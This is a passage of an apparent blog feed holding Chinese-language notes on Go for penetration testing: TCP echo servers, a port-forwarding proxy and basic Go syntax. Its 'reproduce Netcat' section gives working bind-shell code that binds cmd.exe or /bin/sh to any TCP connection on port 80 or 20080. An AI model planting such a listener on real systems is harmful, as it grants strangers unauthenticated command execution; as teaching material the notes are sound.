class="comment">//创建一个缓冲区来接受储存的数据</span></span><br><span class="line">reader :=bufio.NewReader(conn)</span><br><span class="line">s,err := reader.ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to read data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">log.Printf(<span class="string">&quot;Read %d bytes :%s&quot;</span>,<span class="built_in">len</span>(s),s)</span><br><span class="line">log.Println(<span class="string">&quot;Writing data&quot;</span>)</span><br><span class="line">writer := bufio.NewWriter(conn)</span><br><span class="line"><span class="keyword">if</span> _, err := writer.WriteString(s); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to write data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">writer.Flush()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="comment">//在所有接口上绑定 TCP端口 20080</span></span><br><span class="line">listener,err := net.Listen(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;:20080&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to bind to tcp&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">log.Println(<span class="string">&quot;Listening on 0.0.0.0:20080&quot;</span>)</span><br><span class="line"><span class="keyword">for</span>&#123;</span><br><span class="line"><span class="comment">//等待连接，在已经建立连接上创捷 net.Conn</span></span><br><span class="line">conn,err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to accept connection&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理连接，使用gorountine并发</span></span><br><span class="line"><span class="keyword">go</span> echo2(conn)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们不在<code>Conn</code>上调用函数<code>Read([]byte)</code> 和<code>Write([]byte)</code>，而是通过NewReader(io.Reader)和 NewWriter(io.Writer)初始化新的缓冲带。这些调用都以现有的<code>Reader</code>和<code>Writer</code>为基础</p><p>两个缓冲实例都具有用于读取和写入的字符串数据的功能。<code>ReadString(byte)</code>带有一个分隔符，表示数据读取长度。而WritrString(byte)则将字符串写入套接字，写入数据时，需要显示调用<code>writer.Flush()</code>，以便将所有的数据写入底层的<code>Writer</code></p><p>在此示例中，变量conn作为源和目标传递，因为将在建立的连接上回显内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">func echo3(conn net.Conn)  &#123;</span><br><span class="line">defer conn.Close()</span><br><span class="line">//使用io.Copy进行复制</span><br><span class="line">if _,err := io.Copy(conn,conn); err != nil &#123;</span><br><span class="line">log.Fatalln(&quot;unable to read/write data&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-创建一个TCP客户端"><a href="#4-创建一个TCP客户端" class="headerlink" title="4. 创建一个TCP客户端"></a>4. 创建一个TCP客户端</h4><p>在很多情况下，我们需要把一个网站上收到的流量全部转发到另一台服务器，我们可以编写如下代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handle</span><span class="params">(src net.Conn)</span></span>&#123;</span><br><span class="line">dst,err := net.Dial(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;某A网站&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to connect to our unreachable host&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> dst.Close()</span><br><span class="line"><span class="comment">//在gorountine 中运行防止 io.Copy被阻塞</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//将资源的输出复制到目标</span></span><br><span class="line"><span class="keyword">if</span> _,err := io.Copy(dst,src);err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"><span class="comment">//将目标的输出复制回源</span></span><br><span class="line"><span class="keyword">if</span> _,err := io.Copy(src,dst); err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//在本地的80端口上监听</span></span><br><span class="line">listener,err := net.Listen(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;:80&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to bind to port&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn ,err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to accept connection&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> handle(conn)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现在我们把需要转发的网站标记为A，执行脚本的网站标记为B，以便理解下面的思路</p><p>其中，我们调用了两次Copy函数，第一次是确保A网站能和B服务器进行连接，第二次是确保回显的数据被写回到连接客户端的连接中。</p><p>这样，在代理的端口，就能持续接收到他发送的数据</p><h4 id="5-复现Netcat命令"><a href="#5-复现Netcat命令" class="headerlink" title="5. 复现Netcat命令"></a>5. 复现Netcat命令</h4><p>这里用到了Go的包<code>os/exec</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd := exec.Command(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>)</span><br></pre></td></tr></table></figure><p>这将创建Cmd的实例，但尚未执行该命令，可以使用<code>stdin</code>和<code>stdout</code>，或者<code>Copy</code>将Reader或者<code>Writer</code>赋值给<code>Cmd</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd.Stdin= conn</span><br><span class="line">cmd.stdout = conn</span><br></pre></td></tr></table></figure><p>处理完数据流以后，就可以使用<code>cmd.Run()</code>运行命令</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> err := cmd.Run();err != <span class="literal">nil</span>&#123;</span><br><span class="line">    <span class="comment">//处理错误</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上操作很适合在linux下运行，但是在<code>Windows</code>系统上运行程序时，使用<code>cmd.exe</code>而不适用<code>/bin/bash</code>，你就会发现，由于某些Windows特定的匿名管道处理，连接的客户端永远收不到命令输出。</p><p>要解决上面的问题，有两种方案</p><p>首先，可以通过代码显示强制刷新标准输出以事应此席位的差别，不再直接将Conn赋给 cmd.Stdout，而是实现一个包装<code>bufio.Writer</code>(缓冲区写入器)的自定义<code>Writer</code>，并且显示调用<code>Flush</code>方法以强制刷新缓冲区</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bufio&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//Flusher包装 bufio.Writer,显示刷新所有写入</span></span><br><span class="line"><span class="keyword">type</span> Flusher <span class="keyword">struct</span> &#123;</span><br><span class="line">w * bufio.Writer</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//NewFlusher 从 io.Writer 创建一个新的 Flusher</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewFlusher</span><span class="params">(w io.Writer)</span></span> * Flusher&#123;</span><br><span class="line"><span class="keyword">return</span> &amp;Flusher&#123;</span><br><span class="line">w : bufio.NewWriter(w),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写入数据并且显示刷新缓冲区</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foo *Flusher)</span></span> Write(b []<span class="type">byte</span>)(<span class="type">int</span>,<span class="type">error</span>) &#123;</span><br><span class="line">count,err := foo.w.Write(b)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := foo.w.Flush();err != <span class="literal">nil</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>,err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> count,err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handle1</span><span class="params">(conn net.Conn)</span></span>  &#123;</span><br><span class="line"><span class="comment">//显示调用 /bin/sh 并且使用 -i进入交互模式</span></span><br><span class="line"><span class="comment">//这样我们就可以用它作为标准输入和输出</span></span><br><span class="line"><span class="comment">//对于Linux 使用 exec.Command(&quot;/bin/sh&quot;,&quot;-i&quot;)</span></span><br><span class="line">cmd := exec.Command(<span class="string">&quot;cmd.exe&quot;</span>)</span><br><span class="line"><span class="comment">//将标准输入设置为我们的连接</span></span><br><span class="line">cmd.Stdin = conn</span><br><span class="line"><span class="comment">//从连接创建一个Flusher用于标准输出</span></span><br><span class="line"><span class="comment">//这样可以确保标准输出被充分刷新并且通过 net.Conn进行发送</span></span><br><span class="line">cmd.Stdout = NewFlusher(conn)</span><br><span class="line"><span class="comment">//运行命令</span></span><br><span class="line"><span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//在本地的80端口上监听</span></span><br><span class="line">listener,err := net.Listen(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;:80&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to bind to port&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn ,err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to accept connection&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> handle1(conn)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>我这里踩了一个坑 <code>cmd /c</code>，在写脚本的时候，不可以加入 ‘&#x2F;c’参数，否则回一直无法建立连接</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220221183903.png"></p><p>当然，使用<code>telnet</code>也可以，效果是一样的</p><p>另一种方式是使用 <code>io.Pipe()</code>，该函数是<code>go</code>的同步内存管道，可用于连接<code>Reader</code>和<code>Writer</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Pipe</span><span class="params">()</span></span> (*PipeReader, *PipeWriter) &#123;</span><br><span class="line">p := &amp;pipe&#123;</span><br><span class="line">wrCh: <span class="built_in">make</span>(<span class="keyword">chan</span> []<span class="type">byte</span>),</span><br><span class="line">rdCh: <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>),</span><br><span class="line">done: <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;PipeReader&#123;p&#125;, &amp;PipeWriter&#123;p&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据其定义，我们可以对上面的代码进行一个优化</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handle2</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// cmd := exec.Command(&quot;/bin/sh&quot;,&quot;-i&quot;)</span></span><br><span class="line">cmd := exec.Command(<span class="string">&quot;cmd.exe&quot;</span>)</span><br><span class="line">rp, wp := io.Pipe()</span><br><span class="line"><span class="comment">//将标准输入设为我们的连接</span></span><br><span class="line">cmd.Stdin = conn</span><br><span class="line">cmd.Stdout = wp</span><br><span class="line"><span class="keyword">go</span> io.Copy(conn, rp)</span><br><span class="line">cmd.Run()</span><br><span class="line">conn.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">listener, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:20080&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn, err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> handle2(conn)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用<code>io.Pipe</code>的时候，对创建一个同步连接的一个<code>reader</code>和一个<code>writer</code>，任何被写入<code>writer</code>的数据(wp)，都会被<code>reader</code>(rp)读取，因此，我们需要将<code>writer</code>分配给<code>cmd.Stdout</code>，然后使用<code>io.Copy(conn,rp)</code> 将<code>PipeReader</code>链接到<code>TCP</code>连接。之后使用<code>gprountine</code>防止阻塞。命令的标准输入发送到<code>writer</code>，然后通过管道传送到<code>reader</code>，并通过<code>TCP</code>连接输出。</p>]]></content>
    
    
    <summary type="html">对Go渗透测试中Tcp和扫描器的学习</summary>
    
    
    
    <category term="Go渗透测试" scheme="https://h0ld1rs.github.io/categories/Go%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Golang,渗透测试" scheme="https://h0ld1rs.github.io/tags/Golang-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Go渗透测试笔记(一)</title>
    <link href="https://h0ld1rs.github.io/posts/61606.html"/>
    <id>https://h0ld1rs.github.io/posts/61606.html</id>
    <published>2022-02-14T13:34:41.000Z</published>
    <updated>2022-03-01T13:48:19.077Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GO渗透测试笔记-一）"><a href="#GO渗透测试笔记-一）" class="headerlink" title="GO渗透测试笔记(一）"></a>GO渗透测试笔记(一）</h1><h1 id="0X01-基本使用"><a href="#0X01-基本使用" class="headerlink" title="0X01 基本使用"></a>0X01 基本使用</h1><ol><li><p>当在某些极端的情况可以使用<code>go build -ldflags &quot;-w -s&quot;</code>进行编译，从二进制文件中剥离调试信息和字符表，从而减少文件的大小，适合在某些极端的情况进行嵌入（大约可以减少 30%）</p></li><li><p>创建使用不同架构上使用的二进制文件—<strong>交叉编译</strong></p></li><li><p>go doc 函数 –&gt;可以查询有关的包，函数的使用方法文档</p></li><li><p>go get —-&gt;  很多情况下，go程序需要要引入第三方包，可以使用此命令进行导入</p><blockquote><p>即使你使用了 import 导入了相应的包，如<code>stacktian/ldapauth</code>，也无法访问。必须先下载实际的包，</p><p>go get “github.com&#x2F;stacktian&#x2F;ldapauth” 下载实际的包，并且放在 $GOPATH&#x2F;SRC目录下</p></blockquote></li><li><p>go 引入了两个工具<code>dep和mod</code>来锁定清理依赖项，有助于避免正在进行的依赖项不一致</p><blockquote><p>go mod tidy</p><p>go mod download 是使用mod时经常使用的两个命令</p></blockquote></li><li><p>go fmt –&gt;可以自动格式化源代码，强制使用正确的换行符，缩进和大括号来设置代码样式。—&gt;大部分IDE包含的钩子会在保存文件时自动执行 go fmt，因此无需显式执行该命令</p></li><li><p>golint 和 go vet命令</p><blockquote><p>go fmt 会更改代码的语法样式，但是golint会报告样式错误，例如缺少注释，不遵循约定的变量命名等，无用的类型等等。</p><p>golint时独立工具，需要 go get -u “golang.org&#x2F;x&#x2F;lint&#x2F;golint”进行下载</p><p>go vet 也会尝试确定编译器中可能忽略的问题，其中一些可能是合法的错误</p></blockquote></li><li><p>GO Playground -&gt; 托管的执行环境，为开发人员提供了稳定的web前端，以快速，测试，执行和共享Go代码段，但是会限制使用系统命令和第三方交互</p></li></ol><h2 id="go-的基本语法"><a href="#go-的基本语法" class="headerlink" title="go 的基本语法"></a>go 的基本语法</h2><h4 id="1-结构体和接口"><a href="#1-结构体和接口" class="headerlink" title="1. 结构体和接口"></a>1. 结构体和接口</h4><p>定义如下方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="type">string</span></span><br><span class="line">Age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p * Person)</span></span> sayHello()  &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;hello&quot;</span>,p.Name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> guy = <span class="built_in">new</span>(Person)</span><br><span class="line">guy.Name = <span class="string">&quot;Dave&quot;</span></span><br><span class="line">guy.Age = <span class="number">12</span></span><br><span class="line">guy.sayHello()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此语言定义Person变量的方法，sayHello()，其他语言将p视为<code>self</code>与<code>this</code>的引用。</p><blockquote><p>于此同时，结构体缺少作用域修饰符(如 public ，private 等等)，</p><p>Go语言中通过大写字母确定作用域，以大写字母开头的类型和字段可以在包外部进行导出并访问，以小写字母开头的类型和字段是私有的，只能在包内部访问</p></blockquote><p>引入接口时</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="type">string</span></span><br><span class="line">Age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p * Person)</span></span> sayHello()  &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;hello&quot;</span>,p.Name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span>  Friend <span class="keyword">interface</span> &#123;</span><br><span class="line">sayHello()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Greet</span><span class="params">(f Friend)</span></span>  &#123;</span><br><span class="line">f.sayHello()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> guy = <span class="built_in">new</span>(Person)</span><br><span class="line">guy.Name = <span class="string">&quot;Dave&quot;</span></span><br><span class="line">Greet(guy)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义了名为<code>friend</code>的接口，该接口需要实现一个方法<code>sayHello</code>，这意味着任何实现了方法<code>sayHello()</code>类型的都是<code>Friend</code>，</p><blockquote><p>注意：Friend实际上并未实现这个函数，他只是说，如果你是Friend，则能够使用<code>sayHello</code></p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="type">string</span></span><br><span class="line">Age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="type">string</span></span><br><span class="line">Age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Dog)</span></span> sayHello() &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;woof,woof&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p * Person)</span></span> sayHello()  &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;hello&quot;</span>,p.Name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span>  Friend <span class="keyword">interface</span> &#123;</span><br><span class="line">sayHello()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Greet</span><span class="params">(f Friend)</span></span>  &#123;</span><br><span class="line">f.sayHello()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> guy = <span class="built_in">new</span>(Person)</span><br><span class="line">guy.Name = <span class="string">&quot;Dave&quot;</span></span><br><span class="line">Greet(guy)</span><br><span class="line"><span class="keyword">var</span> dog = <span class="built_in">new</span> (Dog)</span><br><span class="line">Greet(dog)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-控制结构"><a href="#2-控制结构" class="headerlink" title="2 控制结构"></a>2 控制结构</h4><p>Go 包含的控制结构比其他现代语言要少的多。Go主要的语法条件是<code>if/else</code></p><p>用户输入的时候用<code>fmt.Scanln()</code>比较合适</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span 